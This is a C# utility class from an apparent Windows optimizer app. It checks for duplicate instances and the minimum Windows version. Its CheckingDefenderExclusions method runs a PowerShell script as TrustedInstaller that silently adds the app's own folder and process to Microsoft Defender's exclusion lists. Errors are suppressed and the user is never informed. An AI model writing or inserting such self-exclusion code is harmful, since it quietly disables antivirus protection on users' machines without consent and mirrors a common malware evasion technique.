using EvolveOS_Optimizer.Utilities.Helpers;
using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace EvolveOS_Optimizer.Utilities.Controls
{
    internal static class RunGuard
    {
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr handle, int cmdShow);

        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr handle);

        private const int SW_RESTORE = 9;

        internal static void CheckingApplicationCopies()
        {
            Process current = Process.GetCurrentProcess();
            var process = Process.GetProcessesByName(current.ProcessName)
                                 .FirstOrDefault(p => p.Id != current.Id);

            if (process != null)
            {
                IntPtr handle = process.MainWindowHandle;
                if (handle != IntPtr.Zero)
                {
                    ShowWindow(handle, SW_RESTORE);
                    SetForegroundWindow(handle);
                }
            }
        }

        internal static async Task CheckingSystemRequirements()
        {
            bool isCompatible = await Task.Run(() =>
            {

                var version = Environment.OSVersion.Version;

                return version.Major >= 10 && version.Build >= 18362;
            });

            if (!isCompatible)
            {
                NativeMessageBox(
                    "This application requires Windows 10 version 1903 (Build 18362) or higher.",
                    "System Requirements"
                );

                Environment.Exit(0);
            }
        }

        internal static async Task CheckingDefenderExclusions()
        {
            string currentLocation = AppContext.BaseDirectory.TrimEnd('\\');

            await Task.Run(async () =>
            {
                try
                {
                    string psScript = $@"
                $ErrorActionPreference = 'Stop';
                $target = '{currentLocation}';
                try {{
                    $mp = Get-MpPreference;
                    if ($mp.ExclusionProcess -notcontains $target) {{
                        Add-MpPreference -ExclusionProcess $target;
                    }}
                    if ($mp.ExclusionPath -notcontains $target) {{
                        Add-MpPreference -ExclusionPath $target;
                    }}
                }} catch {{ 
                    # Fail silently
                }}";


                    await CommandExecutor.RunCommandAsTrustedInstaller(psScript, true);
                    Debug.WriteLine("[RunGuard] Defender exclusions verified.");
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"[RunGuard] Defender Error: {ex.Message}");
                }
            });
        }

        // Helper for showing errors before the XAML engine is fully ready
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);

        private static void NativeMessageBox(string message, string title)
        {
            MessageBox(IntPtr.Zero, message, title, 0x00000010); // 0x10 is MB_ICONERROR
        }
    }
}